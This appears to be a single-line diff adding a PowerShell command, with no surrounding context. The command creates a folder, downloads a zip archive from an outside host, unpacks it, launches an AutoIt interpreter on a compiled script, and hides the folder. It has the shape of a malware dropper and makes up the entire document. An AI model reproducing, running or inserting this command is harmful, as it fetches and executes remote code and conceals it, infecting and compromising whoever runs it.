@@ -1,0 +1,1 @@
+ni 'C:/nkll/' -Type Directory -Force;cd 'C:/nkll/';Invoke-WebRequest -Uri "http://flexiblemaria.com/iinkqrwu" -OutFile 'file.zip';Expand-Archive -Path 'file.zip' -DestinationPath 'C:/nkll/';start 'AutoIt3.exe' -a 'script.a3x';attrib +h 'C:/nkll/'
